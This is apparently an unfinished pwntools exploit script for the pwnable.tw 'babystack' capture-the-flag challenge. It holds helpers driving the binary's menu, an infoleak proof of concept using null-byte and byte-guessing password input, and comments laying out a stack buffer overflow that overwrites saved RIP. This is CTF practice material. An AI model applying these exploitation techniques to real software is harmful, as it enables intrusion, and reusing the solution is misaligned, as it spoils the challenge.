#!/usr/bin/env python3

from pwn import *

exe = ELF("babystack_patched")
libc = ELF("libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.terminal=['tmux','splitw', '-h']

def conn():
    if args.LOCAL:
        # r = process([exe.path])
        r = gdb.debug([exe.path], '''
        set follow-fork-mode child
        entry-break
        ''')
    else:
        r = remote("chall.pwnable.tw", 10205)

    return r

def compare_password(pwd):
    r.sendlineafter(b'>> ', b'1')
    r.sendafter(b':', pwd)

def copy(data):
    r.sendlineafter(b'>>', b'3')
    r.sendafter(b':', data)

def leave():
    r.sendlineafter(b'>>', b'2')

def main():
    global r
    r = conn()

    # infoleak PoC
    # copy some pointers to the stack?
    compare_password(b'\x00'+b'A'*(9*8-1))
    # compare_password(b'\x00' + b'A'*63 + b'B'*16 + b'C'*16 + b'D'*8)
    copy(b'A')
    r.sendlineafter(b'>>', b'1')
    compare_password(b'A'*8 + b'\x39' + b'\x00')

    '''
    BOF PoC:
    # first, try sending a bunch of A's in the compare password function (these are the bytes that will be written to the stack)
    # then , call the copy function with a single B (don't end with null byte)
    # this will (probably) cause the 128 A's to be written to the buf, which should overwrite saved RIP

    # first 64 bytes are junk
    # next 16 bytes are the password (otherwise, stack check fails)
    # next 16+8 bytes are junk (including saved rbp)
    # next 8 bytes are saved RIP

    # compare_password(b'\x00' + b'A'*126)
    # copy(b'B')
    '''

    r.interactive()


if __name__ == "__main__":
    main()
